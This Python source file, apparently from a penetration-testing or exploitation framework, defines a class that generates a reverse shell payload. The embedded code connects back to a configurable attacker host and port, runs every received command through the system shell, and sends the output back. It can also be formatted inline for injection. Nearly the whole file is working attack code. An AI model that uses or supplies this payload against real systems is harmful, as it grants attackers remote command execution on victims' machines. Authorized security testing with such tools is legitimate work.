from .base import ShellCode


class PythonShellCode(ShellCode):
    """
        Class with shellcodes for python language
    """

    def __init__(self, connect_back_ip='localhost', connect_back_port=5555):
        ShellCode.__init__(self, connect_back_ip=connect_back_ip, connect_back_port=connect_back_port)

    def get_python_code(self, bad_chars):
        """
            Function to get python shellcode
        """

        if not self.connect_back_ip or not self.connect_back_port:
            print("Settings for connect back listener must be defined")
            return False

        python_code = """
        #!/usr/bin/python
        import socket,subprocess
        HOST = '{{LOCALHOST}}'    # The remote host
        PORT = {{LOCALPORT}}      # The same port as used by the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect to attacker machine
        s.connect((HOST, PORT))
        # send we are connected
        s.send('[*] Connection Established!')
        # start loop
        while 1:
            # recieve shell command
            data = s.recv(1024)
            print data
            # if its quit, then break out and close socket
            if data == 'quit' or data == 'q':
                break
            # do shell command
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # read output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            # send output to attacker
            s.send(stdout_value)
        # close socket
        s.close()
        """

        python_code = self.format_shellcode(python_code)
        return python_code

    def get_shellcode(self, inline=False):
        shell = self.get_python_code(self.bad_chars)
        if inline:
            shell = self.make_inline(shell)
        return shell
